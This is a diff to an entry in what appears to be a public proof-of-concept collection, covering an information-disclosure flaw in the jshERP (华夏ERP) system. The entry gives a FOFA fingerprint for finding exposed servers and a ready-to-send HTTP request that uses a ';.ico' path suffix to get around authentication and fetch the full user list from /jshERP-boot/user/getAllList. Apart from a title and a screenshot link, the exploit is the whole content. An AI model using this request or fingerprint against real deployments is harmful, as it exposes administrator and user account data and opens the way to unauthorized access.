@@ -1,5 +1,9 @@
-## jshERP 信息泄露漏洞
+## 华夏ERP管理员信息泄露漏洞
 
+## fofa
+```
+icon_hash="-1298131932"
+```
 ## POC
 ```
 GET /jshERP-boot/user/getAllList;.ico HTTP/1.1
@@ -10,3 +14,5 @@ Accept: */*
 Accept-Language: en
 Accept-Encoding: gzip
 ```
+
+![image](https://github.com/wy876/POC/assets/139549762/c56b507b-923f-46c0-a858-bfa938df0829)
